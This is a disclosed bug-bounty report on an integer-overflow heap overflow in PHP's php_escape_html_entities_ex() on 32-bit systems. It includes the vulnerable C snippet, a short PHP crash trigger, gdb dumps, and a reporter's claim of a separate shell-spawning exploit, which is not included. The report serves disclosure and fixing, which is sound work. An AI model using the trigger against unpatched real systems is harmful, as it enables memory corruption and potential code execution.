# Heap overflow due to integer overflow in php_escape_html_entities_ex() function

## Report Details
- **Report ID**: 180582
- **URL**: https://hackerone.com/reports/180582
- **State**: Closed
- **Severity**: low
- **Submitted**: 2016-11-07T07:21:42.625Z
- **Disclosed**: 2019-11-12T09:22:04.703Z

## Reporter
- **Username**: fosec
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
The fix for this bug has been committed: https://bugs.php.net/bug.php?id=73398
Description:
------------
I have found some vulnerable code at ```php_escape_html_entities_ex()``` function. ```php_escape_html_entities_ex()``` function creates a new zend_string object to store html data. The size of destination string depends on the size of source string. ( refer at `ext/standard/html.c:1272` )

``` c
PHPAPI zend_string *php_escape_html_entities_ex(unsigned char *old, size_t oldlen, int all, int flags, char *hint_charset, zend_bool double_encode)
{
...
	/* initial estimate */
	if (oldlen < 64) {
		maxlen = 128;
	} else {
		maxlen = 2 * oldlen;
		if (maxlen < oldlen) {
			zend_throw_error(NULL, "Input string is too long");
			return NULL;
		}
	}

replaced = zend_string_alloc(maxlen, 0);
...
}
```

If `oldlen` is equal to PHP_INT_MAX, `maxlen` will be an unexpected value and `zend_string_alloc()` function will allocate a small memory range. Due to missing check of size before calling
`zend_string_alloc()`, this new memory range can not use to store large html data and lead to heap overflow. I can overwrite other objects of PHP in memory. This bug is only triggered in 32bit machine.

Solution:
It should be `zend_string_alloc_safe` instead of `zend_string_alloc`. 

Test script:
---------------
``` php
<?php
ini_set('memory_limit', -1);
$s = str_repeat("A", PHP_INT_MAX);
htmlentities($s, 0, "", true);
?>
```
Actual result:
--------------
Open php program in gdb and run test script, set a breakpoint at line in file `ext/standard/html.c:1269`.
When debugger stops, we have `oldlen=0x7fffffff`. Because `oldlen` is bigger than 0x64, `maxlen` is equal to twice `oldlen`. `maxlen` is equal to 0xfffffffe. 
```
 [----------------------------------registers-----------------------------------]
EAX: 0xfffffffe
EBX: 0x1
ECX: 0x10
EDX: 0x5
ESI: 0xb7814100 --> 0x2
EDI: 0xfffffffe
EBP: 0xbfffbf68 --> 0xbfffbfb8 --> 0xbfffc084 --> 0x0
ESP: 0xbfffbee0 --> 0x80001000 ('A' <repeats 200 times>...)
EIP: 0x826e37a (<php_escape_html_entities_ex+442>:      call   0x82fc010 <_emalloc>)
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x826e371 <php_escape_html_entities_ex+433>: mov    edi,DWORD PTR [ebp-0x34]
   0x826e374 <php_escape_html_entities_ex+436>: lea    ecx,[edi+0x14]
   0x826e377 <php_escape_html_entities_ex+439>: and    ecx,0xfffffffc
=> 0x826e37a <php_escape_html_entities_ex+442>: call   0x82fc010 <_emalloc>
   0x826e37f <php_escape_html_entities_ex+447>: mov    esi,eax
   0x826e381 <php_escape_html_entities_ex+449>: mov    DWORD PTR [eax],0x1
   0x826e387 <php_escape_html_entities_ex+455>: mov    DWORD PTR [eax+0x4],0x6
   0x826e38e <php_escape_html_entities_ex+462>: mov    DWORD PTR [eax+0x8],0x0
[------------------------------------stack-------------------------------------]
0000| 0xbfffbee0 --> 0x80001000 ('A' <repeats 200 times>...)
0004| 0xbfffbee4 --> 0xb7ce07e9 (<madvise+25>:  pop    ebx)
0008| 0xbfffbee8 --> 0xb7ce07f7 (<madvise+39>:  add    ecx,0xc7809)
0012| 0xbfffbeec --> 0x82f9774 (<zend_mm_chunk_alloc_int+100>:  mov    eax,esi)
0016| 0xbfffbef0 --> 0x37400000 --> 0x2
0020| 0xbfffbef4 --> 0x80001000 ('A' <repeats 200 times>...)
0024| 0xbfffbef8 --> 0xe
0028| 0xbfffbefc --> 0x88dd0c0 --> 0x88dd0f8 --> 0x2
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0826e37a      122             zend_string *ret = (zend_string *)pemalloc(ZEND_MM_ALIGNED_SIZE(_ZSTR_STRUCT_SIZE(len)), persistent);
gdb-peda$
```


The size which is used as parameter in `_emalloc()` function is equal to `((oldlen * 2 + 0x14 ) & 0xfffffffc)`. Due to integer overflow, if `oldlen` is equal to 0x7fffffff, this size is 0x10. The new memory region is too small to store a large string! 

if we continue running, other memory region will be overwritten until SIGSEGV!
```
 [----------------------------------registers-----------------------------------]
EAX: 0x41 ('A')
EBX: 0x199fa0
ECX: 0x37599fb0 ('A' <repeats 200 times>...)
EDX: 0x3
ESI: 0x199fa1
EDI: 0xb7866050 --> 0x1
EBP: 0xbfffbf68 --> 0xbfffbfb8 --> 0xbfffc084 --> 0x0
ESP: 0xbfffbee0 --> 0x80001000 ('A' <repeats 200 times>...)
EIP: 0x826eaf1 (<php_escape_html_entities_ex+2353>:     mov    BYTE PTR [edi+ebx*1+0x10],al)
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x826eae8 <php_escape_html_entities_ex+2344>:        mov    ebx,DWORD PTR [ebp-0x38]
   0x826eaeb <php_escape_html_entities_ex+2347>:        movzx  eax,BYTE PTR [ecx]
   0x826eaee <php_escape_html_entities_ex+2350>:        mov    esi,DWORD PTR [ebp-0x30]
=> 0x826eaf1 <php_escape_html_entities_ex+2353>:        mov    BYTE PTR [edi+ebx*1+0x10],al
   0x826eaf5 <php_escape_html_entities_ex+2357>:        lea    eax,[ebx+0x1]
   0x826eaf8 <php_escape_html_entities_ex+2360>:        mov    DWORD PTR [ebp-0x38],eax
   0x826eafb <php_escape_html_entities_ex+2363>:        jmp    0x826e810 <php_escape_html_entities_ex+1616>
   0x826eb00 <php_escape_html_entities_ex+2368>:        test   BYTE PTR [ebp+0x14],0x2
[------------------------------------stack-------------------------------------]
0000| 0xbfffbee0 --> 0x80001000 ('A' <repeats 200 times>...)
0004| 0xbfffbee4 --> 0xb7ce07e9 (<madvise+25>:  pop    ebx)
0008| 0xbfffbee8 --> 0xb7ce07f7 (<madvise+39>:  add    ecx,0xc7809)
0012| 0xbfffbeec --> 0x82f9774 (<zend_mm_chunk_alloc_int+100>:  mov    eax,esi)
0016| 0xbfffbef0 --> 0x37400000 --> 0x2
0020| 0xbfffbef4 --> 0x80001000 ('A' <repeats 200 times>...)
0024| 0xbfffbef8 --> 0xe
0028| 0xbfffbefc --> 0x88dd0c0 --> 0x88dd0f8 --> 0x2
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0826eaf1 in php_escape_html_entities_ex (old=0x37400010 'A' <repeats 200 times>..., oldlen=0x7fffffff, all=<optimized out>, all@entry=0x1, flags=0x0, hint_charset=0x88cce38 "",
    double_encode=double_encode@entry=0x1) at /root/fuzzer/PHP-7.1/ext/standard/html.c:1378
1378                                            ZSTR_VAL(replaced)[len++] = mbsequence[0];
gdb-peda$
```
I can leak memory to bypass ASLR + DEP and control eip register to the arbitrary value. Finally, the overflow results as arbitrary code execution. The attached script which executes at local machine can leak library data and run `/bin/sh`. :)


## Attachments
- php_escape_html_entities_ex_exploit.php
